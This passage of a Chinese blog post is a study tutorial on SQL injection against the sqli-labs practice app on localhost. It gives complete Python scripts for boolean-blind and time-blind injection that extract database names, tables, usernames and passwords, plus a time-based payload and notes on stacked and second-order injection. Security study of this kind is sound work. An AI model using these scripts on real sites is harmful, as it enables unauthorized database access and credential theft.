+</blockquote>
+<ul>
+<li>使用二分法来快速查找，先是之是否大于64，一步步比较</li>
+</ul>
+<h2 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import requests</span><br><span class="line"># 获取数据库名长度</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(1, 10):</span><br><span class="line">        url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php&#39;&#39;&#39;</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;?id&#x3D;1&#39; and length(database())&gt;%s&#39;&#39;&#39; % i</span><br><span class="line">        # print(url+payload+&#39;%23&#39;)</span><br><span class="line">        r &#x3D; requests.get(url + payload + &#39;%23&#39;)</span><br><span class="line">        if &#39;You are in&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            # print(&#39;false&#39;)</span><br><span class="line">            print(&#39;database_length:&#39;, i)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_len()</span><br><span class="line"></span><br><span class="line">#获取数据库名</span><br><span class="line">def database_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 9):</span><br><span class="line">        for i in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr(database(),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            # print(url+&#39;%23&#39;)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;database_name:&#39;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_name()</span><br><span class="line"></span><br><span class="line"># 获取数据库表</span><br><span class="line">def tables_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 30):</span><br><span class="line">        for i in &#39;abcdefghijklmnopqrstuvwxyz,&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;table_name:&#39;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tables_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取表中字段</span><br><span class="line">def columns_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 30):</span><br><span class="line">        for i in &#39;abcdefghijklmnopqrstuvwxyz,&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;column_name:&#39;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">columns_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取username</span><br><span class="line">def username_value():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 100):</span><br><span class="line">        for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz,_-&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr((select group_concat(username) from users),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;username_value:&#39;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username_value()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取password</span><br><span class="line">def password_value():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 100):</span><br><span class="line">        for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz,_-&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr((select group_concat(password) from users),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;password_value:&#39;, name)</span><br><span class="line"></span><br><span class="line">password_value()</span><br></pre></td></tr></table></figure>
+<h2 id="sqlserver数据库-3"><a href="#sqlserver数据库-3" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h2><h2 id="Oracle数据库-2"><a href="#Oracle数据库-2" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><hr>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ul>
+<li>对界面没有回显时可以尝试使用时间盲注，即如果语句正确就延迟，通过延迟的时间判断sql语句是否被执行了<h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><blockquote>
+<p>sleep()                          //延迟函数<br>if(condition,true,false)          //条件语句<br>ascii()                          //转换成ascii码<br>substring(“string”,strart,length)//mid()也一样，取出字符串里的第几位开始，长度多少的字符</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h2><blockquote>
+<p>?id=’ or if ((select ascii(substr(table_name,1,1)) from information_schema.tables where table_name=database() limit 0,1)&gt;0,sleep(5),0) %23<br>//判断第一个表的第一个字符是否大于0，如果大于0则sleep，不大于0则不会sleep,同样要使用python脚本</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 获取数据库名长度</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(1, 10):</span><br><span class="line">        url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-9&#x2F;index.php&#39;&#39;&#39;</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;?id&#x3D;1&#39; and if(length(database())&gt;%s,sleep(5),0)&#39;&#39;&#39; % i</span><br><span class="line">        # print(url+payload+&#39;%23&#39;)</span><br><span class="line">        time1 &#x3D; datetime.datetime.now()</span><br><span class="line">        r &#x3D; requests.get(url + payload + &#39;%23&#39;)</span><br><span class="line">        time2 &#x3D; datetime.datetime.now()</span><br><span class="line">        sec &#x3D; (time2 - time1).seconds</span><br><span class="line">        if sec &gt;&#x3D; 5:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(i)</span><br><span class="line">            break</span><br><span class="line">    print(&#39;database_len:&#39;, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_len()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#获取数据库名</span><br><span class="line">def database_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 9):</span><br><span class="line">        for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-9&#x2F;index.php&#39;&#39;&#39;</span><br><span class="line">            payload &#x3D; &#39;&#39;&#39;?id&#x3D;1&#39; and if(substr(database(),%d,1)&#x3D;&#39;%s&#39;,sleep(5),1)&#39;&#39;&#39; % (</span><br><span class="line">                j, i)</span><br><span class="line">            # print(url+payload+&#39;%23&#39;)</span><br><span class="line">            time1 &#x3D; datetime.datetime.now()</span><br><span class="line">            r &#x3D; requests.get(url + payload + &#39;%23&#39;)</span><br><span class="line">            time2 &#x3D; datetime.datetime.now()</span><br><span class="line">            sec &#x3D; (time2 - time1).seconds</span><br><span class="line">            if sec &gt;&#x3D; 5:</span><br><span class="line">                name +&#x3D; i</span><br><span class="line">                print(name)</span><br><span class="line">                break</span><br><span class="line">    print(&#39;database_name:&#39;, name)</span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><ul>
+<li>在SQL中，分号（;）是用来表示一条sql语句的结束。我们可以尝试使用分号闭合前面的sql语句，再构造另一条sql语句<blockquote>
+<p>show databases<br>show tables<br>show columns from ‘’</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><ul>
+<li>攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</li>
+<li>使用地方：修改账户密码、发布留言、发布内容的部分等需要与数据库交互的</li>
+</ul>
+<hr>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">fy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fybc.xyz/posts/13153/">http://fybc.xyz/posts/13153/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://fybc.xyz" target="_blank">fyのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql/">sql</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/posts/27105/"><img class="prev_cover" src="http://42.193.169.175/blogcover/b5.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">内网渗透</div></div></a></div><div class="next-post pull_right"><a href="/posts/23825/"><img class="next_cover" src="http://42.193.169.175/blogcover/b.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">markdown</div></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var requestSetting = function (from,set) {
+  var from = from
+  var setting = set.split(',').filter(function(item){
+  return from.indexOf(item) > -1
+  });
+  setting = setting.length == 0 ? from :setting;
+  return setting
+}
+
+var guestInfo = requestSetting(['nick','mail','link'],'nick,mail,link')
+var requiredFields = requestSetting(['nick','mail','link'],'nick,mail')
+
+window.valine = new Valine({
+  el:'#vcomment',
+  appId: 'Ai8gPeGPDrgXYLVTWPco9uTz-gzGzoHsz',
+  appKey: '0MqdgdVvLQaBaTWBwG1lEOi8',
+  notify: false,
+  verify: false,
+  placeholder: 'Please leave your footprints',
+  avatar: 'monsterid',
+  meta: guestInfo,
+  pageSize: '10',
+  lang: 'zh-CN',
+  recordIP: false,
+  serverURLs: '',
+  emojiCDN: '',
+  emojiMaps: "",
+  enableQQ: true,
+  requiredFields: requiredFields
+});</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By fy</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script id="canvas_nest" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="/js/third-party/canvas-nest.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script></body></html>
